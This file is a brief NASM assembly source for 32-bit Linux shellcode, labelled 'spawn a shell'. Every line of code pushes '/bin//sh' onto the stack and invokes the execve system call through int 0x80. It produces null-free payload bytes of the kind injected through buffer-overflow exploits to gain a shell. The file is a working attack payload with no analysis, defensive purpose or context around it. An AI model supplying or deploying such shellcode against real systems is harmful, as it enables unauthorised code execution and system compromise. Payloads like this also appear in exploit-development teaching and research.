; nasm -f bin shellcode.asm

;LSoD spawn a shell

;syscall     %eax %ebx,%ecx,%edx
;----------- ---- ---------------------------------------------------------------
;exec        x00b ->path="/bin//sh",->[->a0=path,0]

SYS_EXECVE equ 0x0B

USE32

   xor    eax,eax    ;zero eax
   push   eax        ;null terminate "/bin//sh"
   push   0x68732f2f ;//sh
   push   0x6e69622f ;/bin
   mov    ebx, esp   ;argv[0]
   push   eax        ;null terminate argv list
   push   ebx        ;argv[0]
   mov    ecx, esp   ;argv
   cdq               ;zero edx
   mov    al, SYS_EXECVE
   int    0x80

